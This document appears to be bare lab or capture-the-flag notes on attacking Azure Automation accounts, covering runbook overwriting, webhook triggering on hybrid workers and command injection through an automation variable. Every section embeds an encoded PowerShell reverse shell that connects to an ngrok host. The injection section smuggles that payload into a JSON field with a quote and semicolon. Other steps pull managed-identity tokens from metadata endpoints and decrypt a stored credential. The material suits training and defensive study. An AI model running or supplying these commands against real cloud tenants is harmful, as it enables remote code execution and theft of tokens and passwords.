# Azure Automation Accounts

## Micros­oft.Au­tomati­on/aut­omatio­nAccou­nts/ru­nbooks­/draft­/write

```sh
az automation account list
az automation runbook list --resource-group automation-labs --automation-account-name automation-labs-1-02fedb58
az automation runbook replace-content --no-wait --resource-group automation-labs --automation-account-name automation-labs-1-02fedb58 --name "Get-SystemInfo" --content "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMAAuAHQAYwBwAC4AZQB1AC4AbgBnAHIAbwBrAC4AaQBvACIALAAxADgAMAA2ADgAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"

az rest --method PUT --url "https://management.azure.com/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourceGroups/automation-labs/providers/Microsoft.Automation/automationAccounts/automation-labs-1-02fedb58/runbooks/Get-SystemInfo/draft/testJob?api-version=2023-05-15-preview" --headers "Content-Type=application/json" --body '{
    "parameters": {},
    "runOn": "",
    "runtimeEnvironment": "PowerShell-5.1"
  }'

# From the automation account
$tokenAuthURI = $env:MSI_ENDPOINT + "?resource=https://vault.azure.net/&api-version=2017-09-01"; $tokenResponse = Invoke-RestMethod -Method Get -Headers @{"Secret"="$env:MSI_SECRET"} -Uri $tokenAuthURI; $tokenResponse.access_token
```

## Micros­oft.Au­tomati­on/aut­omatio­nAccou­nts/we­bhooks­/write

```sh
az automation account list
az automation runbook list --resource-group automation-lab-2 --automation-account-name automation-labs-2-02fedb58
az automation runbook replace-content --no-wait --resource-group automation-lab-2 --automation-account-name automation-labs-2-02fedb58 --name "Get-SystemInfoAndEnvironment" --content "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMAAuAHQAYwBwAC4AZQB1AC4AbgBnAHIAbwBrAC4AaQBvACIALAAxADgAMAA2ADgAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"

# Then to use an hybrid worker
az automation runbook publish --resource-group automation-lab-2 --automation-account-name automation-labs-2-02fedb58 --name "Get-SystemInfoAndEnvironment"

az automation hrwg list --resource-group automation-lab-2 --automation-account-name automation-labs-2-02fedb58

# Depending on user rights, start it
az automation runbook start --resource-group automation-lab-2 --automation-account-name automation-labs-2-02fedb58 --name "Get-SystemInfoAndEnvironment" --run-on automation-lab-2-hybrid-worker-group

# Or create a webhook to trigger it
az rest --method put \
  --uri "https://management.azure.com/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourceGroups/automation-lab-2/providers/Microsoft.Automation/automationAccounts/automation-labs-2-02fedb58/webhooks/whtest?api-version=2015-10-31" \
  --body '{
    "name": "whtest",
    "properties": {
      "isEnabled": true,
      "expiryTime": "2027-12-31T23:59:59+00:00",
      "runOn": "automation-lab-2-hybrid-worker-group",
      "runbook": {
        "name": "Get-SystemInfoAndEnvironment"
      }
    }
  }'

curl -X POST -H "Content-Length: 0" "https://6d9daf9b-aa93-450f-a3a7-1892de111160.webhook.ne.azure-automation.net/webhooks?token=AtTE3caNsqjOuZxnzNrUN49sesYZLnTYbtf307hK2jQ%3d"

# From the automation account
$tokenAuthURI = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://vault.azure.net/"; $tokenResponse = Invoke-RestMethod -Method Get -Headers @{"Metadata"="true"} -Uri $tokenAuthURI; $tokenResponse.access_token
```

## Comman­d Inject­ion

```sh
az automation account list
az automation runbook list --resource-group automation-lab-3 --automation-account-name automation-labs-3-02fedb58

# Get runbook content
az rest --method GET --url "https://management.azure.com/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourcegroups/automation-lab-3/providers/Microsoft.Automation/automationAccounts/automation-labs-3-02fedb58/runbooks/Process-EnvironmentConfig/content?api-version=2024-10-23"

# Get variables
az rest --method GET --url "https://management.azure.com/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourcegroups/automation-lab-3/providers/Microsoft.Automation/automationAccounts/automation-labs-3-02fedb58/variables?api-version=2024-10-23"

az rest --method PUT \
--url "https://management.azure.com/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourcegroups/automation-lab-3/providers/Microsoft.Automation/automationAccounts/automation-labs-3-02fedb58/variables/Configuration?api-version=2019-06-01" \
--headers "Content-Type=application/json" \
--body `{
    "name": "environment",
    "properties": {
        "description": "",
        "value": "{\"config_directory\":\"C:\\\\Config\",\"environment\":\"Production'; powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMAAuAHQAYwBwAC4AZQB1AC4AbgBnAHIAbwBrAC4AaQBvACIALAAxADgAMAA2ADgAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA #\"}",
        "isEncrypted": false
    }
}`

# Get job output
az automation job list --resource-group automation-lab-3 --automation-account-name automation-labs-3-02fedb58
az rest --method GET --url "https://management.azure.com/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourcegroups/automation-lab-3/providers/Microsoft.Automation/automationAccounts/automation-labs-3-02fedb58/jobs/a6b3945f-fb29-448e-a1dd-5a7e15bcec3f/output?api-version=2023-11-01"

az rest --method GET --url "https://management.azure.com/subscriptions/84ee4289-c90a-4af0-b16e-57e147947286/resourcegroups/automation-lab-3/providers/Microsoft.Automation/automationAccounts/automation-labs-3-02fedb58/credentials?api-version=2023-11-01"

# From the automation account
$creds = Get-AutomationPSCredential -Name "FlagCredential"

$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($creds.password); $UnsecurePassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR) [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($BSTR); $UnsecurePassword
```
